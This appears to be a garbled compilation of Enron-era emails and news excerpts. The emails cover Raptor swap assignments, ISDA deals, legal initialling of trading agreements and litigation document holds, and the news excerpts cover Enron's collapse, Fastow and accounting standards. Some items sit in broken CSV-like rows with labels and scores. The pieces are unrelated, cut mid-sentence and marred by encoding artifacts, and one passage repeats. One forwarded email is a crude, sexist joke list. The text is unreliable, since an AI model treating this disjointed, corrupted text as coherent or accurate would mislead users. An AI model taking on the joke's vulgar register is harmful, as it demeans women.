One of the key driver to the utility-by-utility allocation is the difference between total volume and share of DWR costs.   DWR allocated costs to have a uniform ""rate"" across the net short by utility.   Thus those with a larger portion of their total demand (SDG&E and to a lesser extent PG&E) which is covered by DWR, have a higher unit cost across all rates for the Bonds and Contracts.  Edison has the converse.

Any changes in assumptions are welcomed.



Regards,



Michael

Frankly, I do not know what it means to assign a swap from 1 of these vehicles to another vehicle. I think that in general the schedules to the ISDAs that each of the 2 sets of parties executed are the same, but what happens in the case of differences? My rather simplistic approach would be to terminate the existing swaps in Raptor 2 and execute new swaps at the same time and on the same terms in Raptor 4. Unless anyone objects, I propose that we proceed along the lines outlined above, using the Raptor process documentation developed by Lisa and recently updated by Gordon.We recently [like yesterday] received closing books on Raptor 3 and distributed those. If Anyone needs documentation on the other 3 structures, let us know....[Realizing that they are about to change due to the planned merger of Raptor 1, 2 and 4 into Mega-Raptor -- sounds like a bad Rug-Rats movie I recently had the misfortune of viewing doesn't it?] -----Original Message-----Subject: Re: assignment of trade to Raptor vehicleNo. I guess the first step is to know into which Raptor the swaps are moving and to get Joel to give us a closing book on that Raptor so we can get the correct parties etc. Attached is an assignment/assumption document I drafted for the VPP transaction which might be helpful (of course, it has a lot of inapplicable specifics) . We ought to also check with Joel about any provisions in the rest of the vehicle docs that may apply to an assignment. I would think that if all parties join and consent and provide no ED or TE under the ISDAs shall occur on the basis of the assignment that it would be clean from the ISDA point of view.

There was also fai=lures in the performance of Enron's outside advisors. And there was a funda=mental default of leadership and management, starting with former CEO Ken L=ay and reaching to the board and senior managers. As Congress begins a week= of hearings, the House Financial Services capital markets subcommittee als=o heard from SEC Chairman Harvey Pitt. Powers joined the Enron board to inv=estigate events leading up to the company filing for bankruptcy on December= 2nd.

But they shoulder som=e of the blame: Congress, including some of Enron's most vocal critics ther=e, routinely opposed significant new accounting rules over the past decade.Lynn Turner, head of Colorado State University's Center for Quality Financi=al Reporting and a former chief accountant at the Securities and Exchange C=ommission, cites several attempts to improve accounting standards throughou=t the 1990s that Congress fought. One effort, in particular, would have str=engthened the authority of the Financial Accounting Standards Board, an ind=ependent rule-making body.=20The standards board has come under blistering attacks each time from compan=ies who press Congress not to require new accounting disclosures. ""Pressure=s from some members of Congress have unfortunately led to compromises that =I don't believe were always in the interest of investors,"" Mr. Turner says.==20Some prominent past critics of the standards board are playing a different =tune. Beyond zeroing in on Enron's own longtime auditor, Arthur Andersen LL=P, Congress intends to explore whether to toughen requirements for how comp=anies are audited and what information must be disclosed to investors.=20Consider Rep. Richard Baker, the Louisiana Republican who chairs a House su=bcommittee on capital markets, securities and government-sponsored enterpri=ses.

Subject:	Knauf Fiber Glass Transaction

Chris, Mike & Mark,

I want to pass along my thanks to Enron's legal and credit staff for their substantial contribution in finalizing the transaction with Knauf.  Carol St. Clair, Tracy Ngo and Ed Sacks did a tremendous job developing a structure that made sense for all parties and finalizing an ISDA agreement in 3 working days - with a German based company no less.   Ed and Tracy quickly developed Credit terms and provided valuable input into the transaction structure.  Carol worked tirelessly developing and negotiating the ISDA with Knauf.  Additionally, she sought out counsel within Enron familiar with German law allowing us to ascertain the appropriate authority levels within Knauf to execute the ISDA.  It was the effort of these individuals that allowed this deal to happen.

I have extended my thanks and appreciation to them, but wanted to make you were aware of their contribution.

We booked a 3 year, fixed price swap in N.  California originating just under $1 MM.

Thanks,

Jeffrey Keen
2918 6th Street, Apt.  1
Santa Monica, CA 90405

To Mr. Ken Lay,

I'm writing to urge you to donate the millions of dollars you made from selling Enron stock before the company declared bankruptcy to funds, such as Enron Employee Transition Fund and REACH, that benefit the company's employees, who lost their retirement savings, and provide relief to low-income consumers in California, who can't afford to pay their energy bills.  Enron and you made millions out of the pocketbooks of California consumers and from the efforts of your employees.

Indeed, while you netted well over a $100 million, many of Enron's employees were financially devastated when the company declared bankruptcy and their retirement plans were wiped out.  And Enron made an astronomical profit during the California energy crisis last year.  As a result, there are thousands of consumers who are unable to pay their basic energy bills and the largest utility in the state is bankrupt.

The New York Times reported that you sold $101 million worth of Enron stock while aggressively urging the company's employees to keep buying it.  Please donate this money to the funds set up to help repair the lives of those Americans hurt by Enron's underhanded dealings.

Sincerely,

Lucent, the most heavily traded stock on the NYSE, fell $1.47 to $6.43--a drop of more than 18%. ""When Lucent announces a layoff on top of previous layoffs, it shows there are more recession-type strategies being used for survival purposes,"" said Ned Riley, chief investment strategist for State Street Global Advisors. Long-distance telephone and cable television giant AT&T said stiff competition and weak prices in the long-distance phone market hurt profit, and warned third-quarter revenue may fall.

RANDOM,0,"Subject: 2001 Internal Communications Survey

We'd like you to fill out this survey about Enron's Corporate Internal Communications programs.  Why?  Because our job is to advance your job by providing internal communications tools and information that will help you work more effectively.  And don't worry.  The survey is confidential.

How can you be assured that completing this survey is not a waste of your time?

1.  We will post all of the numerical results on Enron's corporate intranet.  (Probably not the individual comments, though, because that would be way too much to read!)

2.  Our programs are based on what you want, so we need your feedback to assess how we're meeting your needs and where we can make improvements.

The survey will only take you about ten minutes or less, honest.  Thanks for participating.

Whatever happened afterthe draft and invitation to comment were issued in the run-up to Christmas,``Australia will have to make a choice.''Accounting bodies worldwide have been working on standards for financialinstruments to prevent the derivatives -related disasters that rocked manycompanies during the late 1980s and early 1990s, including US companyProcter & Gamble, which lost $US157 million on interest-rate derivatives in1994.The matter has become urgent in Australia partly because the United Stateshas introduced its own standard Financial Accounting Standard Boardstatement No133 which became effective for some companies on July 1, andwhich will operate from January 1 for those whose financial years coincidewith the calendar.FAS 133 is regarded as a nightmare by corporate treasurers in the US andhere, because it requires derivatives and other financial instruments to be``marked to market'' every quarter, rather than accounted for on afair-value basis.Its critics claim it will lead to volatility and confusion in companyfinancial statements.Mr Alfredson said that in the US, ``there is now a special interpretationgroup like the Urgent Issues Group here interpreting 133. In other words, itis so complex, readers can't just read the standard and interpret it. Thegroup has already issued more than 100 interpretations.''Australia has no accounting standard that deals comprehensively with therecognition and measurement of financial instruments, although it has madeprogress with disclosure requirements. Acknowledging the concern over themark-to-market approach, the AASB commissioned the development of afair-value model.The joint working group consists of representatives from Australia, Canada,France, Germany, New Zealand, the Nordic countries, Britain, the US and theInternational Accounting Standards Committee. IASC has incorporated elementsof FAS 133 into its own much-criticised financial instruments standard, IAS39.It remains to be seen how much simpler the fair-value approach will be.``In fair-value accounting, you get the market value for the instruments atthe time and fair value them. It sounds easy in principle, but it is muchmore complicated in practice,'' Mr Alfredson said.Developing the appropriate standard is only half the battle, however; thetrick is to gain widespread acceptance for it. Even if Australia acceptedthe fair-value model, Mr Alfredson said, it would not be able to implementit alone, ``at least if I have any influence''.",0.0,0.0,0.8,0.2

Curve Management ProcessThe markets in which our merchanting division trades are based on the LME curves but are linked to a large number of basis curves for quality and location. Given the vast number we have opted to break down the markets by brand group and port location. E.G. for Copper this means we have a grid with 5 brand groups and 3 sets of port groups (13 for europe, 7 for the US and 6 for the Far East). The maintaince & price testing of the grids is made manageable by the fact the premiums only need be entered for brand and port groups by the traders yet prices can be tested by reference to node points i.e. price of specific brand at a given location which can be checked to a market quote.5. Re recruitment of paper tradersI haven't been able to contact him but I recall that the brother of David Rosenblum, one of the metals traders in Chicago, is a trader of recylced paper.I'll keep you posted on long term system development plans here in London.

Bob,
Thanks for the note-I know we can all appreciate the need to speed up the process, but typically, initialling standard agreements is not where the slow down comes-Legal was not aware that the  standard agreements were being treated any differently than those more negotiated. Legal had authorized Donna Greif's group to originate and send out the standard agreement, but Legal's one check of those was to be through the initialing process--I know Shane was aware of this and has made every effort to comply--perhaps you and Barbara should discuss whether the process should be changed going forward, but until that time, all TPA's and their amendments should continue to come to us before execution. 


Thanks very much--
Sandi

Let me clear up this process.

Suzanne is only looking at the TPA's that are standand/model agreements which had been
pre-approved by legal.

If there are any changes to the model that has been approved, then legal will have to sign-off.

If this is unacceptable, please let me know.

We were only trying to help speed up the process.

Suzanne was not initialing as legal, but as operations rep that there were no deviations
from the model agreement.

Hope this helps.

Donna and Shane,
As I mentioned to you previously, Gerald Nemec will be handling the trading partner agreements upon my departure. His extension is  33512. As has been the practice in the past, Gerald should initial all trading partner agreements and any amendments prior to execution by a VP. I understand that Suzanne Calcagno has initialed some of these agreements without authorization from legal and while I understand she has recently received her law degree and awaits bar results, since she is not part of our legal department we would ask that you continue to abide by the procedures we have set in place to come through our legal department  until such time as Barbara Gray authorizes a different procedure. If you have any questions about that please feel free to contact Barbara Gray at ext. 36832.

And Enron dealt in dozens of other, more exoti=c derivatives markets, from credit to weather to advertising.

Wall Stre=et firms that are active in these highly sophisticated, highly lucrative an=d highly risky markets have elaborate risk-management systems in place to p=revent Enron-like disasters from happening.

""Right now he's concentrating on working out a deal with the Justice Department that would get him full immunity in exchange for any information into Enron,"" a person close to Fastow said. ""Everything else, including the congressional hearings, are secondary and will be dealt with only if a deal with the Justice Department is reached."" 
People close to Fastow said they believe the Justice Department's criminal investigation is focusing heavily on the former CFO and whether he intentionally misled Enron's shareholders by hiding losses in off-balance-sheet partnerships, some of which he ran. 
Bryan Sierra, a spokesman for the Department of Justice, wouldn't comment, saying the investigation into Enron is ongoing. 
Fastow's role in structuring partnerships that allowed Enron to hide losses and the fact that he ran some of those partnerships while serving as Enron's CFO are among the issues at the center of inquiries into the energy trader's collapse. 
Also at issue are the roles played by former Chairman and Chief Executive Ken Lay, former Chief Executive Jeff Skilling, Enron's board of directors, Enron auditor Arthur Andersen and law firm Vinson & Elkins. 
Seeking immunity makes sense given Fastow's position at the center of the financial arrangements in question and the possibility of criminal prosecution, said Sheldon Elsen, a securities attorney with Orans Elsen & Lupert in New York. 
""A guy in Fastow's position, who is involved in tremendous conflicts of interest, possibly insider trading, securities fraud, and he has a great deal of information into Enron finances, you make an immunity deal with the Department of Justice or you don't say anything otherwise it can be used against you,"" Elsen said. ""I would think it highly unlikely at this stage in the game that Fastow would go in and testify before a committee and say things that could be used against him. The people that count most in the end is the Justice Department, because they are the ones that can put you in jail."" 
But authorities might be reluctant to grant immunity, which hampered the prosecution of central figures in the Iran-Contra scandal of the 1980s, Elsen said. 
Fastow was ousted as Enron's chief financial officer in October, after the company reported a $618 million loss in the third quarter and a $1.2 billion hit to shareholder equity stemming in part from transactions with partnerships he headed.

The language that we need for the subject matter of the NDA is ----   ""discussions and exchange information related to a possible transaction or other business relationship involving transactions generated by the EnronOnline platform.""  

With this change, I believe the VMAC document for Marc is ready to go.

Thanks for your comments. I agree with you on the new text. We will not need to release counterparty data in the future. Can you send the agreement out and let me know when it is out to give them a call. With the latest developments this has really become a priority because it can potentially free up cash.

I made the modifications to the VMAC document.  While I understand the business purpose, because we do not want EOL is not and we do not want it to be considered a clearing mechanism, we want to make sure document we prepare do not made these type of references.  As these discussions relate to the platform and the manner in which it operates, would you be comfortable with :  ... would like to engage in discussions and exchange information related to a possible transaction or other business relationship involving transactions generated by the EnronOnline platform.""  If this works, we can implement this language and get the agreement out.

Also, if we are going to discuss anything related to specific transactions with any counterparties or, alternatively, if discussions with VMAC progress to the point where it is contemplated that counterparty information may be released, please remember that this information is confidential and cannot be released to any third party by Enron without the express written consent of the counterparty.

mark to market losses,0,"Gone are the cheerleading stock analysts, who achieved celebrity by touting stocks while quietly collecting bonuses for helping the same companies distribute their shares. The profit outlook for many American corporations is dismal, with or without accounting manipulations.Yet in recent days, a widely followed measure of stock values, the price/earnings ratio (P/E) of the benchmark Standard & Poor's 500 index, once again has climbed to near historic highs, more than 30, nearly the level it was at the market's frothy peak 20 months ago. Have investors failed to learn the lesson of the Nasdaq stock boom and bust? Maybe. But the numbers also indicate this thumbnail indicator investors use to take the temperature of their stock values has itself lost value. ""You shouldn't use a P/E multiple today to make sense of the stock market,"" said Bart Madden, a partner at Chicago-based HOLT Value Associates. The conventional P/E is calculated by dividing the price per share of a stock by the sum of its most recent four quarters' earnings per share. High P/Es--more than 20--are said to reflect optimism, bidding up stock prices before earnings are evident. Low P/Es are said to indicate pessimism--investors refusing to pay much for profits generated. That sounds simple, but it's not. Many definitions of earnings are used these days, leading to radically different P/Es for the same stock. For example, Enron, the embattled Houston-based energy trading company that has been in the news for a series of financial disasters, had a P/E of 47 in Wednesday's Tribune; 54 in The Wall Street Journal and Quicken.com, and 68 on the CNN/Money Web site. By any definition, if a company's earnings per share decline and its stock price stays the same, the P/E will rise, falsely implying more optimism. ""Based on trailing earnings, the present elevated S&P 500 P/E ratio is mostly a function of the collapse in earnings rather than the appreciation in equity prices,"" wrote analyst Joe Liro in a report for Stone & McCarthy Research Associates. For example, the P/E of Lisle-based Tellabs was 35 on March 10, 2000, when the Nasdaq market peaked. It was 35 on Wednesday. But Tellabs shares closed at $16.04 on Wednesday, compared with $57 on March 10, 2000. Earnings at Tellabs have eroded. A more subtle factor affecting the earnings denominator of the P/ E calculation is the failure of accounting rules to reflect changing business conditions in the information age and the expansion of service businesses relative to manufacturers. Many service and information companies invest heavily in research and development and advertising as opposed to plants and equipment. Yet R&D and advertising must be deducted as they are incurred as an expense, resulting in lower profits (and higher P/Es) compared with companies more reliant on plant and equipment investments that are depreciated over many years.",0.0,0.0,0.8,0.2

RANDOM,1,"the Sunday political talk shows. Lawmakers drew the long knives and wasted no time making their feelings known about the report's findings.
       Sen. Dorgan called Enron ""almost a culture of corporate corruption."" Rep. Billy Tauzin, R-La., asked whether ""maybe somebody ought to go to the pokey for this.""
       In the aftermath of such verbal blood-letting, it was almost predictable that Lay would bail on his commitment to appear before Congress Monday. 
       In the face of such withering commentary, Lay's attorney wrote in his letter to the committee chairmen that the embattled former CEO ""firmly rejected any allegations that he engaged in wrongful or criminal conduct.""
       On Monday the heat turned up a notch as staffers began drafting subpoenas. 
       ""Even if he takes the Fifth, and that's exactly what we expect, we're going to make him show his face to the American people,"" a congressional aide told MSNBC.com. 
       Enron's internal report ""confirms my initial impression that Enron was essentially operating, this is my opinion, a gigantic pyramid scheme or shell game within the confines of a publicly traded company,"" Sen. Peter Fitzgerald, R-Ill., told CNBC on Monday. 
       Fitzgerald, as a former lawyer for a bank holding company, has special insight into the financial debacle caused by Enron's collapse.
       ""The company was transferring assets back and forth between partnerships,"" Fitzgerald said. ""At one end the company would book a gain, at the other end there would be initially a loss at the partnership, but then the partnership would transfer it back to Enron, then the partnership would book a gain in a different quarter,"" Fitzgerald said, paraphrasing the findings of the company's internal investigation. 
       ""This is an elaborate hoax in my judgment and how this was allowed to go on with a publicly traded company and how? it broke through all our defenses and finally how the SEC didn't detect it is what we've got to figure out,"" Fitzgerald said.
       
ROCKY WEEK AHEAD
       Fastow and one of his lieutenants at Enron, Michael Kopper, are expected to show up later this week to testify, but congressional aides said they are expected to take the Fifth Amendment, too. However, Jeffrey Skilling, another former Enron CEO is expected to testify before the House Oversight subcommittee on Thursday.

Subject: Joke: Rules of being a guy



Here are some morning funnies =)

********************************************



The Rules of Being A Guy.....

1. Any Man who brings a camera to a bachelor party may be legally killed and
eaten by his fellow partygoers.

2. Under no circumstances may two men share an umbrella.

3. It is ok for a man to cry under the following circumstances:
   a. When a heroic dog dies to save its master
   b. The moment Angelina Jolie starts unbuttoning her blouse
   c. After wrecking your boss' Ferrari
   d. One hour, 12 minutes, 37 seconds into The Crying Game
   e. When your Date is using her teeth

4. Unless he murdered someone in your family, you must bail a friend out of
jail within 12 hours.

5. Acceptable excuse for not helping a friend move
   a. Your legs have been severed in a freak threshing accident

6. Acceptable excuse for not helping a friend of a friend move:
   a. You'd rather stay home and watch speed buggy reruns

7. If you've known a guy for more than 24 hours, his sister is off limits
forever, unless you actually marry her.

8. The minimum amount of time you have to wait for a guy who's running late
is 5 minutes.  Maximum waiting time: 6 minutes.  For a girl, you have to
wait
10 minutes for every point of hotness she scores on the classic 1-10 scale.

9. Bitching about the brand of free beer in a buddy's fridge is forbidden.
Gripe at will if the temperature is unsuitable.

10. No man shall ever be required to buy a birthday present for another man.
(In fact, even remembering your buddy's birthday is strictly optional.)

11. On a road trip, the strongest bladder determines pit stops, not the
weakest.

12. While your girlfriend must bond with your buddies' girlfriends within 30
minutes of meeting them, you are not required to make nice with her gal
pals'
significant dick-heads--- low level sports bonding is all the law requires
(sorry ladies, it's called a double standard because it's twice as true).

13. Unless you have signed a lucrative endorsement contract, do not appear
in
public wearing more than one swoosh.

14. When stumbling upon other guys watching a sporting event, you may always
ask the score of the game in progress, but you may never ask who's playing.

15. You may flatulate in front of a wo",0.0,0.0,0.7,0.0

While most of what we do iscontained within Enron's electronic systems, there still are times when hardcopies are made or needed for running our business. Here is how you musthandle those hard copy documents:1. The basic rule is that if you have hard copies of documents that areused in EPMI's business of selling energy in the WSCC, you must keep thosedocuments until further notice. If space becomes a problem, please contact_____ who can arrange for storage.2. What constitutes a document? In some instances you will have onecopy of a document that has your handwritten notes on it, and another copythat may be clean. For these purposes both are considered documents andboth must be saved. Similarly, if several people have copies of the samedocument, each separate copy is considered a separate document. On theother hand, if you made 10 copies for a meeting and there were 4 left overthat were never handed out or were not used, those may be recycled so longas you keep the ones that were used. If you keep handwritten notes foryour work, those would be considered documents as well. Telephone notes,charts, printouts of data, spreadsheets etc. all constitute documents. Ifyou have a question about what constitutes a document and whether it shouldbe saved, please ask Christian Yoder and Steve Hall.3. The goal and purpose of this policy is to make sure that no hardcopies of documents are discarded that are relevant to the wholesaleelectricity market litigation. If hard copy documents are discarded, at alater point in time EPMI and/or its employees will be criticized for failingto preserve documents relevant to the wholesale electricity litigation.4. Personal documents such as shopping lists, personal messages fromfriends unrelated to the energy business etc. are not covered by this policyand you may do with them as you wish.Tim, if you have questions about this policy, please call me.ThanksGary=======================================================This email message is for the sole use of the intended recipient(s) and may contain confidential and privileged information.

       Network equipment maker Enterasys Networks, another firm under investigation by the SEC, saw its share price plunge 60 percent as analysts downgraded its stock after the company warned of disappointing quarterly revenues. After Friday's close, Enterasys said it had discovered accounting irregularities in its Asian operations. 
       Monday's earnings news failed to calm investors. Shares of computer and printer maker Hewlett-Packard pared early gains and was flat after the firm said its earnings in the quarter ended Jan. 31 will substantially exceed Wall Street's forecast. Shares Compaq Computer, which has proposed to merge with Hewlett-Packard but faces shareholder opposition, also slipped.
       In other earnings news, home improvement retailer Lowe's said its fourth-quarter earnings would top an earlier forecast. And Internet commerce firm Priceline.com reported a fourth-quarter profit versus a year-ago loss. Priceline's shares slid 21 percent.
       Also, Elan's stock price slumped 52 percent after the Irish pharmaceutical company warned that 2002 financial results will fall short of expectations. Its shares came under pressure last week on concerns about the firm's accounting practices. 
       On the Dow, financial issues like J.P. Morgan Chase, Citigroup and American Express fell sharply, reflecting investors' doubts about the timing of an economic recovery. General Electric, a Dow stock with a complicated accounting structure, saw its share price fall 5 percent on concerns its accounting practices might not be up to par.
       Also Monday, President Bush sent Congress a $2.13 trillion budget Monday that provides billions of dollars in new spending for the war on terrorism and homeland security.
       And telecom shares slid after a handful of companies reported bad news. Shares of Williams Communications Group fell 29 percent after its banks warned that it may be in default under its credit agreement. And concerns about WorldCom's debt ratings sent its shares price down 16 percent.
       Fourth-quarter earnings season, which has been the worst in over a decade, moves into lower gear this week. A few big-name firms are slated to report their earnings scorecards, including Web gear maker Cisco Systems.

And this time, it was the gospel truth.=20Hundreds of respected U.S. companies are ferreting away trillions of dollar=s in debt in off-balance-sheet subsidiaries, partnerships, and assorted obl=igations, including leases, pension plans, and take-or-pay contracts with s=uppliers. Potentially bankrupting contracts are mentioned vaguely in footno=tes to company accounts, at best. The goal is to skirt the rules of consoli=dation, the bedrock of the American financial reporting system and the sour=ce of much its credibility. These rules, set clear in 1959, aim to make pub=lic companies give a full and fair picture of their business--including all= the assets and liabilities of any subsidiaries. But accountants, lawyers, =and bankers have learned to drive a coach and horses through them.Because of a gaping loophole in accounting practice, companies create arcan=e legal structures, often called special-purpose entities (SPEs). Then, the= parent can bankroll up to 97% of the initial investment in an SPE without =having to consolidate it into its own accounts. Normally, once a company ow=ns 50% or more of another, it must consolidate it under the 1959 rules. The= controversial exception that outsiders need invest only 3% of an SPE's cap=ital for it to be independent and off the balance sheet came about through =fumbles by the Securities & Exchange Commission and the Financial Accountin=g Standards Board. In 1990, accounting firms asked the SEC to endorse the 3=% rule that had become a common, though unofficial, practice in the '80s. T=he SEC didn't like the idea, but it didn't stomp on it, either. It asked th=e FASB to set tighter rules to force consolidation of entities that were ef=fectively controlled by companies. FASB drafted two overhauls of the rules =but never finished the job, and the SEC is still waiting.=20It's not just the energy industry that exploits the loophole and stashes ma=jor liabilities in the never-never land of SPEs. Increasingly, companies of= all stripes routinely use them to offload potential balance-sheet bombshel=ls such as loan guarantees or the financing of sales of their own products.= For example, the accounts of data processor Electronic Data Systems Corp. =don't show $500 million--half of last year's earnings--that it would owe if= its customers were to cancel their contracts and leave it holding the bag =for loans on their computer equipment. The arrangement is acknowledged only= in a footnote.

GCP procedure is to create Counterparty names that reflect either the

Sam & Stephanie,


It was my understanding with the EOL Team that all divisions would have the 
legal incorporated entity as part of the name.  Stephanie, I my preference is 
to kick their Password Application back and get them to change it to read 
something like ""Cargill Ferrous International, a division of Cargill, Inc.""  
or ""Cargill, Inc. acting through its Cargill Ferrous International Division"".

interested in standardized trading of bandwidth at a meeting put together by 
CompTel, a telecom industry trade association.

bandwidth trading market - companies that will ""take title to,"" or own, 
bandwidth. In other words, principals will be either telecom carriers or 
companies that will buy and sell bandwidth to manage risk in the 
telecommunications industry.

conditions needed to establish a liquid market for bandwidth trading.

But once the state government started pumping its own cash into themarket, the phony posted prices plummeted and supplies became plentifulagain. Now California is swimming in power and nobody talks about an ""energycrisis"" anymore.You can date the loss of investor confidence in Enron almost exactly to themoment when the California fiasco began to repair itself. Fortune Magazineput the inaugural nail in Enron's coffin in March, noting that the company'sgrowing dependence on trading had turned it into an oil-patch version ofGoldman Sachs. Goldman's stock sells at a price-earnings multiple of 17,reflecting investors' well-founded distrust of trading earnings to bereproduced reliably year after year. So why, the magazine asked, was Enronawarded a multiple of 60-plus? Mmm...Enron did yeoman service as a champion of deregulation. Boss Ken Lay, abeliever in technology and the power of markets, was a true visionary, tothe point of annoying people who didn't care for his air of being a man onthe right side of history. The moldering pipeline he took over wouldcertainly have been an also-ran if he had not thrown Enron headlong intotrading and marketing.But deregulation doesn't confer permanent advantage on anybody. Aderegulated environment favors constant innovation and a continual upsettingof plans and strategies.Add the fact that, despite the California bubble, there is no reason tobelieve energy prices won't continue their long-term relative decline astechnology advances more quickly than the depletion of conventionalresources. Add also the likelihood that information technology will continueto lower the barriers to entry to Enron's trading business, which means morecompetition and shrinking margins. Enron begins to look a lot like Phibro.The great commodity-trading machine was already running down by 1981, whenit bought Salomon and Wall Street was swooning. Inflation was being quelledby Paul Volcker. The products that Phibro traders bought and sold wereincreasingly being traded transparently on electronic exchanges. ""Four orfive years ago, they used to be able to take other companies to thecleaners, because they knew where the market was and others didn't,"" atrader explained. ""With everyone knowing, within a few cents, where theprice of any product was, Phibro's ability to make a profit off its superiorknowledge disappeared.""Not only is this true of Enron, but of its would-be bottom fisher, Dynegy,run by Mr. Lay's Houston homeboy, Chuck Watson.

record keeping accounting practices,0,"Accounting rules should be based on the concept of risk andreward, requiring companies to list more of the assets andliabilities that are at risk on the balance sheet, Berardino wrotein a piece entitled ``Enron: A Wake-Up Call.'' Current rules havefostered a ``technical, legalistic mindset that is sometimes moreconcerned with form than with substance,'' Berardino said. Enron, whose auditor was Arthur Andersen, filed forbankruptcy protection after posting a third-quarter loss of $1.01billion in October. The Houston-based company used off-balance-sheet financing vehicles that enabled it to boost leverage withoutreporting to investors the increased debt on its balance sheet. The U.S. financial reporting model, which emphasizeshistorical information and a single earnings-per-share number, wascreated in the 1930s, when most assets were tangible and therewere no derivatives or off-balance-sheet financing. It needs to beupdated to take into account new complex financial structures andthe associated risks, Berardino said. Today, disclosures should becontinuous, not periodic, and include performance indicatorsbeyond earnings-per-share, Berardino said. Berardino also said that it takes too long to set newstandards because regulatory responsibilities are shared by toomany agencies. ``Responsibility for administering discipline istoo diffuse and punishment is not sufficiently certain to promoteconfidence in the profession,'' Berardino wrote.EDF Says It's in Talks to Buy Enron's European Retail Unit2001-12-04 09:01 (New York)EDF Says It's in Talks to Buy Enron's European Retail Unit Paris, Dec. 4 (Bloomberg) -- Electricite de France, Europe'slargest power company, said it is in negotiations to buy theEuropean retail energy business of Enron Corp., the U.S. energytrader that filed for bankruptcy protection.

Bill directs PUC to open service-quality rulemaking

A bill has been introduced in the House that would direct the Public
Utilities Commission to open a rulemaking to set new telecom
service-quality standards.  HB 127 would require the commission to draft
rules that would apply to all telecom services necessary to provide
local exchange service.

The commission currently only has one rule related to service quality,
which addresses restoration of service, the PUC staff told TR.  The new
rules that would be drafted as a result of this bill would be much
broader, the staff said.

HB 127 would authorize the commission to determine the appropriate
amount for administrative penalties if a provider failed to meet a
standard.  The assessed penalty for each unmet standard should be
proportionate to the number of affected customers and the frequency of
noncompliance with the standards, according to the measure.

HB 127, which was sponsored by the House State Affairs Committee, awaits
committee referral.

AT&T Corp. has asked the Public Utility Commission not to delay its

recommended by the PUC's policy development division.  AT&T suggested
that the PUC consider a limited review of the USF sharing mechanism
beginning in June, with a full review starting no later than one year
from now.  The company asked that the revised support levels be
determined by the end of 2002.

According to AT&T, the USF funding levels were derived from 1997 data.

Whatever happened afterthe draft and invitation to comment were issued in the run-up to Christmas,``Australia will have to make a choice.''Accounting bodies worldwide have been working on standards for financialinstruments to prevent the derivatives -related disasters that rocked manycompanies during the late 1980s and early 1990s, including US companyProcter & Gamble, which lost $US157 million on interest-rate derivatives in1994.The matter has become urgent in Australia partly because the United Stateshas introduced its own standard Financial Accounting Standard Boardstatement No133 which became effective for some companies on July 1, andwhich will operate from January 1 for those whose financial years coincidewith the calendar.FAS 133 is regarded as a nightmare by corporate treasurers in the US andhere, because it requires derivatives and other financial instruments to be``marked to market'' every quarter, rather than accounted for on afair-value basis.Its critics claim it will lead to volatility and confusion in companyfinancial statements.Mr Alfredson said that in the US, ``there is now a special interpretationgroup like the Urgent Issues Group here interpreting 133. In other words, itis so complex, readers can't just read the standard and interpret it. Thegroup has already issued more than 100 interpretations.''Australia has no accounting standard that deals comprehensively with therecognition and measurement of financial instruments, although it has madeprogress with disclosure requirements. Acknowledging the concern over themark-to-market approach, the AASB commissioned the development of afair-value model.The joint working group consists of representatives from Australia, Canada,France, Germany, New Zealand, the Nordic countries, Britain, the US and theInternational Accounting Standards Committee. IASC has incorporated elementsof FAS 133 into its own much-criticised financial instruments standard, IAS39.It remains to be seen how much simpler the fair-value approach will be.``In fair-value accounting, you get the market value for the instruments atthe time and fair value them. It sounds easy in principle, but it is muchmore complicated in practice,'' Mr Alfredson said.Developing the appropriate standard is only half the battle, however; thetrick is to gain widespread acceptance for it. Even if Australia acceptedthe fair-value model, Mr Alfredson said, it would not be able to implementit alone, ``at least if I have any influence''.",0.0,0.0,0.7,0.2

Lay, the chairman of the Enron Corporation, after Jeffrey K.Skilling resigned unexpectedly as chief executive on Aug. 14. Its authorwas later identified as Sherron S. Watkins, a vice president forcorporate development at Enron. The House Energy and Commerce Committeereleased excerpts of the letter on Monday and the full letter yesterday: Has Enron become a risky place to work? For those of us who didn'tget rich over the last few years, can we afford to stay? Skilling's abrupt departure will raise suspicions of accountingimproprieties and valuation issues. Enron has been very aggressive inits accounting -- most notably the Raptor transactions and the Condorvehicle. We do have valuation issues with our international assets andpossibly some of our EES MTM positions. The spotlight will be on us, the market just can't accept thatSkilling is leaving his dream job. I think that the valuation issues canbe fixed and reported with other good will write-downs to occur in 2002.How do we fix the Raptor and Condor deals? They unwind in 2002 and 2003,we will have to pony up Enron stock and that won't go unnoticed. To the layman on the street, it will look like we recognized fundsflow of $800 million from merchant asset sales in 1999 by selling to avehicle (Condor) that we capitalized with a promise of Enron stock inlater years. Is that really funds flow or is it cash from equityissuance? We have recognized over $550 million of fair value gains on stocksvia our swaps with Raptor. Much of that stock has declined significantly-- Avici by 98 percent from $178 million, to $5 million; the New PowerCompany by 80 percent from $40 a share, to $6 a share. The value in theswaps won't be there for Raptor, so once again Enron will issue stock tooffset these losses. Raptor is an LJM entity. It sure looks to thelayman on the street that we are hiding losses in a related company andwill compensate that company with Enron stock in the future. I am incredibly nervous that we will implode in a wave of accountingscandals. My eight years of Enron work history will be worth nothing onmy resume, the business world will consider the past successes asnothing but an elaborate accounting hoax. Skilling is resigning now for''personal reasons'' but I would think he wasn't having fun, looked downthe road and knew this stuff was unfixable and would rather abandon shipnow than resign in shame in two years.",0.9,0.8,0.9,0.8
RANDOM,0,"Subject: RE: Red Soup Recipe

Hattie,
 
This recipe is from my Paris cooking class.  It is supposed to be wonderful served chilled (when we cooked it in class, we served it warm).  Be careful not to add too much cream since chilling it makes it a little thicker anyway.  Also, after you puree it in the blender, Marie Blanche (our cooking teacher) recommends that you strain all of the chunks out with cheese cloth. She says the reason for this is so that the guests will have a harder time figuring out all of the ingredients.  It is part of the Parisian mystery of cooking.
 
Good Luck!

I have not yet seen the new Attachment M, so it may be a complex or costly process, but hopefully, it will be fine.Now, for the Important Question. MISO does not believe they will be able to process third-party loss schedules (either INT or EXT, in Tag parlance) on Dec 15.

RANDOM,0,"Subject: Rating agency meetings

Hello,

As you know, this week I met with S&P on Wednesday and Moody's on Thursday.  
S&P had three people there including Peter Rigby and William Chew (MD 
infrastructure finance) and Moody's had eight people there including Susan 
Abbot (MD corp. finance, power group).  I thought the meetings went very 
well.  There was an active dialogue during both presentations and a lot of 
questions were asked.  The stated objective for both meetings was that Enron 
has gone as far as we can with our product development working in a vacuum, 
and that we feel we have developed a structure that covers the dominant 
outstanding risk that merchant generators are exposed to (market prices), and 
that we think this is enough to achieve an investment grade rating, but if 
not then what more do we need.  Both gave me no commitments but promised to 
give me preliminary feedback next week.

We e-mailed copies of the presentation to both of you yesterday.

